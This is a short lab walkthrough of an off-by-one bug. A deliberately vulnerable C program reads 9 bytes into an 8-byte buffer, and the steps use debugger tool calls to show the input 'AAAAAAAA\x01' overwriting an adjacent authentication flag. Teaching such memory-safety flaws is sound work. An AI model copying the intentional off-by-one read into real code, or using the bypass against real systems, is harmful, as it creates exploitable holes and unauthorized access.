# Off-by-One — Null Byte / Adjacent Variable Overwrite

An off-by-one vulnerability where reading 9 bytes into an 8-byte buffer
overwrites the adjacent `authenticated` flag.

## The Binary

```c
char password[8] = "secret!";
char input[8];
int authenticated = 0;

read(0, input, 9);  // off-by-one: reads 9 bytes into 8-byte buffer
if (strncmp(input, password, 8) == 0)
    authenticated = 1;
```

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -o off-by-one off-by-one.c`

## Walkthrough

### 1. Load binary

```
edb_load_program(path="/tmp/off-by-one")
edb_list_functions()
```

### 2. Disassemble to see stack layout

```
edb_disassemble(location="main", count=30)
```

Look for the `authenticated` variable — it's a local int placed right after
the `input[8]` buffer on the stack.

### 3. Set breakpoint and inspect

```
edb_set_breakpoint(location="main+60")
edb_run()
edb_get_stack(count=16)
```

Send `AAAAAAAA` (8 A's) at the prompt. Step through:

```
edb_step_instruction(count=5)
edb_get_stack(count=16)
```

You should see the `authenticated` variable (at `rbp-0x4`) remains 0 because
the 9th byte (null) was not written.

### 4. Exploit with the 9th byte

Send `AAAAAAAA\x01` as input. The 9th byte overwrites the least significant
byte of `authenticated`, setting it to 1.

```
edb_restart_program()
edb_run()
# send: AAAAAAAA\x01
edb_get_stack(count=16)
```

The `authenticated` flag is now `0x01` — access granted.

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `edb_disassemble` | View stack layout and authenticate logic |
| `edb_get_stack` | Visualize the stack and confirm adjacent variable overwrite |
| `edb_set_breakpoint` | Pause after `read()` to inspect memory |
| `edb_step_instruction` | Single-step through the comparison |
| `edb_read_memory` | Read raw memory of `authenticated` variable |
| `edb_restart_program` | Reload and re-run with different input |
